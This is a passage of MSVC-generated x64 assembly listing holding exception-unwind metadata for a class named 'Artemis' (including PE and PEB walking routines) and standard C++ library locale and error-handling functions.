	DD	imagerel $cppxdata$?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	092H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	018H
	DW	01dH
	DW	0211H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DB 06H
	DB	00H
	DB	00H
	DB	':'
	DB	02H
	DB	09dH, 07H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0??walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
	DD	imagerel $ip2state$?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 011d19H
	DD	0e20eH
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
	DD	062H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1LDR_DATA_TABLE_ENTRY@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0LDR_DATA_TABLE_ENTRY@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?hex@std@@YAAEAVios_base@1@AEAV21@@Z DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?getloc@ios_base@std@@QEBA?AVlocale@2@XZ DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?width@ios_base@std@@QEAA_J_J@Z DD 010e01H
	DD	0220eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?setf@ios_base@std@@QEAAHHH@Z DD 011201H
	DD	02212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?good@ios_base@std@@QEBA_NXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?clear@ios_base@std@@QEAAXH_N@Z DD 011201H
	DD	0e212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gfailure@ios_base@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0failure@ios_base@std@@QEAA@AEBV012@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1failure@ios_base@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0failure@ios_base@std@@QEAA@PEBDAEBVerror_code@2@@Z DD 031501H
	DD	070116215H
	DD	06010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_G?$ctype@_W@std@@MEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_narrow@?$ctype@_W@std@@MEBAPEB_WPEB_W0DPEAD@Z DD 011801H
	DD	04218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_narrow@?$ctype@_W@std@@MEBAD_WD@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01eH
	DB	07bH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Donarrow@?$ctype@_W@std@@IEBAD_WD@Z DD 022319H
	DD	070107214H
	DD	imagerel __GSHandlerCheck
	DD	038H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_widen@?$ctype@_W@std@@MEBAPEBDPEBD0PEA_W@Z DD 011801H
	DD	04218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_widen@?$ctype@_W@std@@MEBA_WD@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Dowiden@?$ctype@_W@std@@IEBA_WD@Z DD 020e01H
	DD	0700a720eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_toupper@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_toupper@?$ctype@_W@std@@MEBA_W_W@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_tolower@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_tolower@?$ctype@_W@std@@MEBA_W_W@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_scan_not@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z DD 011801H
	DD	04218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_scan_is@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z DD 011801H
	DD	04218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_is@?$ctype@_W@std@@MEBAPEB_WPEB_W0PEAF@Z DD 011801H
	DD	04218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_is@?$ctype@_W@std@@MEBA_NF_W@Z DD 011401H
	DD	06214H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01dH
	DB	072H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Init@?$ctype@_W@std@@IEAAXAEBV_Locinfo@2@@Z DD 042219H
	DD	0110113H
	DD	0600b700cH
	DD	imagerel __GSHandlerCheck
	DD	070H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$ctype@_W@std@@MEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 0eH
	DB	00H
	DB	00H
	DB	092H
	DB	02H
	DB	'b'
	DB	04H
	DB	'H'
	DB	02H
	DB	012H
	DB	04H
	DB	014H
	DB	06H
	DB	' '
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DB	05eH
	DD	imagerel ?dtor$1@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 028H
	DD	imagerel $stateUnwindMap$?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
	DD	imagerel $ip2state$?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DD 021111H
	DD	0190111H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z DB 06H
	DB	00H
	DB	00H
	DB	'F'
	DB	02H
	DB	'>'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z
	DD	imagerel $ip2state$??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z DD 011311H
	DD	04213H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?widen@?$ctype@_W@std@@QEBA_WD@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?is@?$ctype@_W@std@@QEBA_NF_W@Z DD 011401H
	DD	04214H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z DB 0aH
	DB	00H
	DB	00H
	DB	','
	DB	02H
	DB	'!', 02H
	DB	04H
	DB	'v'
	DB	02H
	DB	'('
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z
	DD	imagerel $ip2state$??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z DD 010911H
	DD	0c209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_G?$ctype@D@std@@MEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_narrow@?$ctype@D@std@@MEBAPEBDPEBD0DPEAD@Z DD 011801H
	DD	04218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_widen@?$ctype@D@std@@MEBAPEBDPEBD0PEAD@Z DD 011801H
	DD	04218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_toupper@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_toupper@?$ctype@D@std@@MEBADD@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_tolower@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_tolower@?$ctype@D@std@@MEBADD@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$ctype@D@std@@IEAAXXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Init@?$ctype@D@std@@IEAAXAEBV_Locinfo@2@@Z DD 031001H
	DD	0700c8210H
	DD	0600bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$ctype@D@std@@MEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 0eH
	DB	00H
	DB	00H
	DB	092H
	DB	02H
	DB	'b'
	DB	04H
	DB	'H'
	DB	02H
	DB	012H
	DB	04H
	DB	014H
	DB	06H
	DB	' '
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DB	05eH
	DD	imagerel ?dtor$1@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 028H
	DD	imagerel $stateUnwindMap$?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
	DD	imagerel $ip2state$?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DD 021111H
	DD	0190111H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z DB 06H
	DB	00H
	DB	00H
	DB	'F'
	DB	02H
	DB	'>'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z
	DD	imagerel $ip2state$??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z DD 011311H
	DD	04213H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?widen@?$ctype@D@std@@QEBAPEBDPEBD0PEAD@Z DD 011801H
	DD	04218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?widen@?$ctype@D@std@@QEBADD@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gctype_base@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1ctype_base@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0ctype_base@std@@QEAA@_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?c_str@locale@std@@QEBAPEBDXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1locale@std@@QEAA@XZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0locale@std@@QEAA@AEBV01@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gfacet@locale@std@@MEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1facet@locale@std@@MEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0facet@locale@std@@IEAA@_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	013H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0eH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??Bid@locale@std@@QEAA_KXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$_Yarn@_W@std@@AEAAXXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Yarn@_W@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$_Yarn@D@std@@AEAAXXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?c_str@?$_Yarn@D@std@@QEBAPEBDXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Yarn@D@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getlconv@_Locinfo@std@@QEBAPEBUlconv@@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01dH
	DB	060H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ DD 042519H
	DD	0130113H
	DD	0600b700cH
	DD	imagerel __GSHandlerCheck
	DD	080H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ DD 031001H
	DD	0700cc210H
	DD	0600bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??1_Locinfo@std@@QEAA@XZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??1_Locinfo@std@@QEAA@XZ DB 060H
	DD	imagerel $ip2state$??1_Locinfo@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1_Locinfo@std@@QEAA@XZ DD 010919H
	DD	04209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??1_Locinfo@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$6@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$5@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$4@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$3@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$2@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0_Locinfo@std@@QEAA@PEBD@Z DB 012H
	DB	00H
	DB	00H
	DB	'<'
	DB	02H
	DB	'$'
	DB	04H
	DB	'$'
	DB	06H
	DB	'$'
	DB	08H
	DB	'$'
	DB	0aH
	DB	'$'
	DB	0cH
	DB	'$'
	DB	0eH
	DB	'L'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0_Locinfo@std@@QEAA@PEBD@Z DB 0eH
	DB	0eH
	DD	imagerel ?dtor$0@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$2@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$3@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$4@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$5@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$6@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0_Locinfo@std@@QEAA@PEBD@Z DB 028H
	DD	imagerel $stateUnwindMap$??0_Locinfo@std@@QEAA@PEBD@Z
	DD	imagerel $ip2state$??0_Locinfo@std@@QEAA@PEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Locinfo@std@@QEAA@PEBD@Z DD 010e11H
	DD	0420eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0_Locinfo@std@@QEAA@PEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_G_Facet_base@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Throw_bad_cast@std@@YAXXZ DD 010401H
	DD	08204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_cast@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_cast@std@@QEAA@AEBV01@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_cast@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_cast@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_G_Iostream_error_category2@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1_Iostream_error_category2@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gsystem_error@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0system_error@std@@QEAA@AEBV01@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1system_error@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01fH
	DB	08aH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0system_error@std@@QEAA@Verror_code@1@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0system_error@std@@QEAA@Verror_code@1@PEBD@Z DB 06H
	DB	00H
	DB	00H
	DB	'n'
	DB	02H
	DB	'^'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0system_error@std@@QEAA@Verror_code@1@PEBD@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0system_error@std@@QEAA@Verror_code@1@PEBD@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0system_error@std@@QEAA@Verror_code@1@PEBD@Z DB 028H
	DD	imagerel $stateUnwindMap$??0system_error@std@@QEAA@Verror_code@1@PEBD@Z
	DD	imagerel $ip2state$??0system_error@std@@QEAA@Verror_code@1@PEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0system_error@std@@QEAA@Verror_code@1@PEBD@Z DD 032419H
	DD	07011c215H
	DD	06010H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??0system_error@std@@QEAA@Verror_code@1@PEBD@Z
	DD	052H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_G_System_error@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
